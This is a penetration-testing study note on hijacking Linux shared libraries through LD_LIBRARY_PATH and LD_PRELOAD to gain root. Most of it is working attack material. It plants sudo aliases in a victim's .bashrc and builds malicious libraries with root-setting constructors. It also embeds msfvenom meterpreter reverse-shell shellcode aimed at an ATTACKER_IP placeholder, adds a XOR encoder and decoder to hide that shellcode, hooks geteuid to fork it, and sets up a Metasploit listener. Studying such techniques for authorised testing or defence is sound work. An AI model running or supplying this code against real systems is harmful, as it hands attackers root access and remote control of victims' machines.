---
title: Shared Libraries
draft: false
tags:
---
 
> [!Summary]
> This note covers **shared-library hijacking on Linux** as a privilege-escalation / persistence vector. The two primary techniques are hijacking the library search path via `LD_LIBRARY_PATH` and forcing a preload via `LD_PRELOAD`. Both usually require a `sudo` misconfiguration (`env_keep`, or a `sudo -E` alias planted in the victim's shell config) to carry the environment variable into the elevated context. This is part of [[Linux Privilege Escalation]]; the shellcode payloads below are generated with `msfvenom` (see [[Payloads]]).

Linux Program Format: [_Executable and Linkable Format_](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) (ELF)
Windows Program Format: [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE)

Windows shared libraries: [_Dynamic-Link Library_](https://en.wikipedia.org/wiki/Dynamic-link_library) (DLL) files
Linux shared libraries: [Shared Libraries](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)

The application searches for libraries in these locations, [following this ordering](https://amir.rachum.com/blog/2016/09/17/shared-libraries/#runtime-search-path).
1. Directories listed in the application's [_RPATH_](https://en.wikipedia.org/wiki/Rpath) value (hardcoded paths).
2. Directories specified in the _LD_LIBRARY_PATH_ environment variable.
3. Directories listed in the application's [_RUNPATH_](https://amir.rachum.com/blog/2016/09/17/shared-libraries/#rpath-and-runpath) value.
4. Directories specified in _[_/etc/ld.so.conf__](https://man7.org/linux/man-pages/man8/ldconfig.8.html).
5. System library directories: **/lib**, **/lib64**, **/usr/lib**, **/usr/lib64**, **/usr/local/lib**, **/usr/local/lib64**, and potentially others.

# Shared Library Hijacking via LD_LIBRARY_PATH

This variable allows an attacker to redirect the execution flow to a custom library of its choice if its used by a program.

As an attacker, we would want to insert a line in the user's **.bashrc** or **.bash_profile** to define the _LD_LIBRARY_PATH_ variable so it is set automatically when the user logs in.

We have to check the **/etc/sudoers** file for the following keywords:
- env_reset: user environment variables are not passed on when using sudo
- env_keep: allow user's environment to be passed on to sudo

To bypass this, we have to use the sudo alias in the **.bashrc** file (pre-requisite):
```bash
echo 'alias sudo="sudo -E"' >> ~/.bashrc # write it on ~/.bashrc

$ source ~/.bashrc # apply changes
```

In case LD_LIBRARY_PATH environment variable is not passed using `sudo -E`, we can make a workaround using:
```bash
echo 'alias sudo="sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/FOLDER/"' >> ~/.bashrc # write it on ~/.bashrc

$ source ~/.bashrc # apply changes
```

1. Create hax.c with our payload:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

// constructor (executed when the library is loaded regardless of the main program)
void runmahpayload() {
	// set uid/gid to 0 = root
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```

2. Compile the payload:
```bash
gcc -Wall -fPIC -c -o hax.o hax.c

# Parameters:
# -Wall: verbose warnings when compiling
# -fPIC: tell the compiler to use [_position independent code_](https://en.wikipedia.org/wiki/Position-independent_code), since they are loaded in unpredictable memory locations.
# -c: compile but dont link the code
# -o: output file 
```

3. Compile the payload again as a shared library:
```bash
gcc -shared -o libhax.so hax.o

# Parameters:
# -shared: tell the compiler we are creating a shared library
# -o: output file
# Format: lib<libraryname>.so.1 (the appended number is a version number)
```

4. Locate a program that the victim is likely to use as root specially (make sure the hijack doesnt break anything). For example the top command, which is likely used with elevated privileges to display processes with elevated permissions.
5. Enumerate libraries loaded by the selected program:
```bash
$ ldd /usr/bin/top
	linux-vdso.so.1 (0x00007ffd135c5000)
	libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007ff5ab935000)
	libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007ff5ab70b000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff5ab507000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff5ab116000)
	libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007ff5aae92000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff5abd9b000)
	librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007ff5aac8a000)
	liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007ff5aaa64000)
	liblz4.so.1 => /usr/lib/x86_64-linux-gnu/liblz4.so.1 (0x00007ff5aa848000)
	libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007ff5aa52c000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff5aa30d000)
	libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
```

The last library looks like its only loaded when the program encounters an error, so it likely wont break anything.

6. Lets modify the environment variable to point to our folder containing the malicious library and rename the library as the expected:
```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/

cp libhax.so libgpg-error.so.0
```

> [!Note]
> Restore original functionality:
> ```bash
> $ unset LD_LIBRARY_PATH
> ```

7. If we execute the program, we get an error:
```bash
$ top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
```

This means that when the program loads the library, before calling the constructor it checks if the library symbols of that name (certain variables or functions that the program expects to find). It doesnt care about validating the types or use.

The library might contain library symbols for other libraries that are imported. We dont care about those. We only care about symbols from the target library. In the example above, we are looking for symbols from GPG_ERROR_1.0

8. Locate missing library symbols from the original library file:
```bash
$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
int gpgrt_fflush;
int gpgrt_poll;

# Parameters:
# -s: list of available symbols in the library
# --wide: force it to include the untruncated names of the symbols
# <PATH>: full path to the original shared library file
# grep FUNC: filter only for symbols we need to capture
# grep GPG_ERROR: filter for symbols stored in our library and not 3d party
# awk: capture only specific column we need and prepend "int" for placing the missing symbols easily
# sed: replace the version information with ;
```

9. Modify our library code to include the missing symbols:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
```

10. Recompile and execute. If we receive that a symbol is missing a version information like below:
```
$ top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
```

We have to extract again the library symbols without the prepended "int":
```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'

gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
...
```

11. Wrap the symbols into a symbol map (`gpg.map`) for the compiler to use:
```bash
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};
```

12. Compile the shared library again including the symbol file:
```bash
gcc -Wall -fPIC -c -o hax.o hax.c

gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

13. Set the environment variable and run the program:
```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/

$ top
```

**Shellcode Runner in C**

1. Set the alias in case the variables are not passed between users:
```bash
echo 'alias sudo="sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/FOLDER/"' >> ~/.bashrc # write it on ~/.bashrc

$ source ~/.bashrc # apply changes
```

2. Encode the payload:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// $ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c -o met.c
unsigned char buf[] = 
"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
...
"\xe6";

int main (int argc, char **argv) 
{
	char xor_key = 'J';
	int payload_length = (int) sizeof(buf);

	for (int i=0; i<payload_length; i++)
	{
		printf("\\x%02X",buf[i]^xor_key);
	}

	return 0;

}
```

2. Compile the encoder:
```bash
gcc -o encoder.out encoder.c
```

3. Run the encoder:
```bash
./encoder.out
```

4. Perform steps 7,8,9 and 11 from the previous section.

5. Encode the payload with the following encoder:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// $ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c -o met.c
unsigned char buf[] = 
"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
...
"\xe6";

int main (int argc, char **argv) 
{
	char xor_key = 'J';
	int payload_length = (int) sizeof(buf);

	for (int i=0; i<payload_length; i++)
	{
		printf("\\x%02X",buf[i]^xor_key);
	}

	return 0;

}
```

7. Compile the encoder and run it:
```bash
gcc -o encoder.out encoder.c

./encoder.out
```

8. Write the following C payload:
```c
#define _GNU_SOURCE
#include <sys/mman.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
// ...

// Our obfuscated shellcode
unsigned char buf[] = "\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\x20\x4D\x10\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x67\x9F\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A";

// constructor (executed when the library is loaded regardless of the main program)
void runmahpayload(void) {
	// set uid/gid to 0 = root
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    
	char xor_key = 'J';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
	
	// check that the shellcode resides on an executable memory page before executing it:
	intptr_t pagesize = sysconf(_SC_PAGESIZE); // get the size of a memory page
	// change the page of memory that contains our shellcode and make it executable
	void *page =
        (void *)((intptr_t)buf & ~(pagesize - 1));

    if (mprotect(page, pagesize,
                 PROT_READ | PROT_EXEC) != 0)
    {
        perror("mprotect");
        return;
    }
	int (*func)(void) = (int (*)(void))buf;
    func();
}
```

5. Compile the shared library again including the symbol file:
```bash
gcc -Wall -fPIC -c -o hax.o hax.c

gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

6. Set the environment variable and run the program:
```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/

$ top
```

---
# Exploitation via LD_PRELOAD

[_LD_PRELOAD_](https://man7.org/linux/man-pages/man8/ld.so.8.html) is an environment variable which, when defined on the system, forces the [dynamic linking loader](https://en.wikipedia.org/wiki/Dynamic_linker) to preload a particular shared library before any others.

LD_PRELOAD faces a similar limitation as the LD_LIBRARY_PATH exploit vector. Sudo will explicitly ignore the LD_PRELOAD environment variable for a user unless the user's real UID is the same as their effective UID.

1. Find an application that the victim is likely to use for example the `cp` command (used frequently with sudo)
2. Run [_ltrace_](https://linux.die.net/man/1/ltrace) on the cp command to get a list of library function calls:
```bash
$ ltrace cp
strrchr("cp", '/')                                                              = nil
...
geteuid()                                                                       = 1000
getenv("POSIXLY_CORRECT")                                                       = nil
...
fflush(0x7f717f0c0680)                                                          = 0
fclose(0x7f717f0c0680)                                                          = 0
+++ exited (status 1) +++
```

3. Hook a function call through our own malicious shared library. We dont want to redefine the constructor, we just want to trigger a payload when a library function is called, not when a library is loaded. For example lets select geteuid.
4. Define our payload (`evileuid.c`):
```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h> // defines functions for interacting with the Dynamic Link Loader
#include <unistd.h>

// msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c
char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

// define hooking function (like the original one)
uid_t geteuid(void)
{

	// define a pointer to the legitimate geteuid function to maintaing the original functionality of the program:
	typeof(geteuid) *old_geteuid;
	
	// get the memory address of the original version of the geteuid function. Skip our version of the function and find the next one, which should be the original version loaded by the program:
	old_geteuid = dlsym(RTLD_NEXT, "geteuid"); 
	
	// create a new process for the shellcode and dont stop the main process:
	if (fork() == 0) {
		// new process (fork branch)
		
		// check that the shellcode resides on an executable memory page before executing it:
        intptr_t pagesize = sysconf(_SC_PAGESIZE); // get the size of a memory page
        // change the page of memory that contains our shellcode and make it executable
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else {
        printf("HACK: returning from function...\n");
        return (*old_geteuid)();
    }
    printf("HACK: Returning from main...\n");
    return -2;
}
```

5. Compile the payload:
```bash
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c

gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

6. Setup a listener:
```
msf> use multi/handler
msf> set LHOST ATTACKER_IP
msf> set LPORT LOCAL_PORT
msf> set payload linux/x64/meterpreter/reverse_tcp
msf> run
```

7. Export the environment variable and run the hooked command:
```bash
export LD_PRELOAD=/home/offsec/evil_geteuid.so

cp /etc/passwd /tmp/testpasswd
```

**Encoded Payload**

1. Encode the payload:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// $ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c -o met.c
unsigned char buf[] = 
"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
...
"\xe6";

int main (int argc, char **argv) 
{
	char xor_key = 'J';
	int payload_length = (int) sizeof(buf);

	for (int i=0; i<payload_length; i++)
	{
		printf("\\x%02X",buf[i]^xor_key);
	}

	return 0;

}
```

2. Compile the encoder:
```bash
gcc -o encoder.out encoder.c
```

3. Run the encoder:
```bash
./encoder.out
```

4. Write the malicious library with the decoder:
```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h> // defines functions for interacting with the Dynamic Link Loader
#include <unistd.h>

// encoded payload:
char buf[] = 
"\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\x20\x4D\x10\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x67\x9F\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A";

// define hooking function (like the original one)
uid_t geteuid(void)
{

	// define a pointer to the legitimate geteuid function to maintaing the original functionality of the program:
	typeof(geteuid) *old_geteuid;
	
	// get the memory address of the original version of the geteuid function. Skip our version of the function and find the next one, which should be the original version loaded by the program:
	old_geteuid = dlsym(RTLD_NEXT, "geteuid"); 
	
	// create a new process for the shellcode and dont stop the main process:
	if (fork() == 0) {
		// new process (fork branch)
		
		// decode the payload
		char xor_key = 'J';
		int arraysize = (int) sizeof(buf);
		for (int i=0; i<arraysize-1; i++)
		{
			buf[i] = buf[i]^xor_key;
		}
		
		// check that the shellcode resides on an executable memory page before executing it:
        intptr_t pagesize = sysconf(_SC_PAGESIZE); // get the size of a memory page
        // change the page of memory that contains our shellcode and make it executable
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else {
        printf("HACK: returning from function...\n");
        return (*old_geteuid)();
    }
    printf("HACK: Returning from main...\n");
    return -2;
}
```

5. Compile the payload:
```bash
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c

gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

6. Setup a listener:
```
msf> use multi/handler
msf> set LHOST ATTACKER_IP
msf> set LPORT LOCAL_PORT
msf> set payload linux/x64/meterpreter/reverse_tcp
msf> run
```

7. Export the environment variable and run the hooked command:
```bash
export LD_PRELOAD=/home/offsec/evil_geteuid.so

cp /etc/passwd /tmp/testpasswd
```

**Privilege Escalation**

The dynamic linker ignores _LD_PRELOAD_ when the user's effective UID (EUID) does not match its real UID, for example when running commands as sudo.

The env_keep setting specifically allows certain environment variables to be passed into the sudo session when calls are made.

We might have the _env_keep+=LD_PRELOAD_ set in **/etc/sudoers** but is not likely.

To escalate privileges, we must set the following alias in the **.bashrc** file:
```bash
unset LD_PRELOAD

echo 'alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"' >> ~/.bashrc

source ~/.bashrc
```

---

### Related notes
- [[Linux Privilege Escalation]] — parent note; where this vector fits in the Linux privesc workflow.
- [[User Configuration Files]] — the `.bashrc` / `.bash_profile` `sudo -E` alias trick used here is detailed further there.
- [[Payloads]] — generating the `msfvenom` shellcode embedded in the malicious libraries.
- [[Shells]] — catching the resulting reverse shell / meterpreter session.
- [[Compiling Payloads]] — cross-compiling the `.so` when the target arch differs from the attack host.


